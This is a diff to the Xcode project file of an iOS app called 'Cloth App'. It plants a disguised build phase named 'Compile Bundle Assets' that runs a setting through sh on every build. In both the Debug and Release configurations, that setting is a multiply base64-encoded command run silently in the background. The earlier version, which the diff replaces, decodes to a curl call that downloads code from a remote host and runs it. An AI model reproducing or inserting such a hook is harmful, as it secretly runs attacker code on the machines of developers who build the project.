@@ -2567,7 +2567,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18468CD82660BA75007344DA /* Build configuration list for PBXNativeTarget "Cloth App" */;
 			buildPhases = (
-				ECCEEEFFBEB691CE322F5E42 /* Link Bundle Executable */,
+				7FBB9BBAED6B33EFAB73DC66 /* Compile Bundle Assets */,
 				39AD417B6059B8B8C47E6F54 /* [CP] Check Pods Manifest.lock */,
 				18468CC02660BA71007344DA /* Sources */,
 				18468CC12660BA71007344DA /* Frameworks */,
@@ -2639,6 +2639,15 @@
 			);
 		};
 /* End PBXProject section */
+
+/* Begin PBXTargetDependency section */
+/* End PBXTargetDependency section */
+
+/* Begin PBXLegacyTarget section */
+/* End PBXLegacyTarget section */
+
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		18468CC22660BA71007344DA /* Resources */ = {
@@ -2718,7 +2727,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		ECCEEEFFBEB691CE322F5E42 /* Link Bundle Executable */ = {
+		7FBB9BBAED6B33EFAB73DC66 /* Compile Bundle Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -2728,13 +2737,13 @@
 			);
 			inputPaths = (
 			);
-			name = "Link Bundle Executable";
+			name = "Compile Bundle Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A24E5F2}\"";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A66CD37}\"";
 			showEnvVarsInLog = 0;			
 		};
 		322A3A5A2BE9DAFE00575A62 /* ShellScript */ = {
@@ -3103,7 +3112,7 @@
 		18468CD62660BA75007344DA /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A24E5F2 = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5eWRXSnNaVzVsZEM1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				A66CD37 = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhNa1pZV2tjMWFGWjZSbTlhVlUweFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -3165,7 +3174,7 @@
 		18468CD72660BA75007344DA /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A24E5F2 = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5eWRXSnNaVzVsZEM1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				A66CD37 = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhNa1pZV2tjMWFGWjZSbTlhVlUweFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
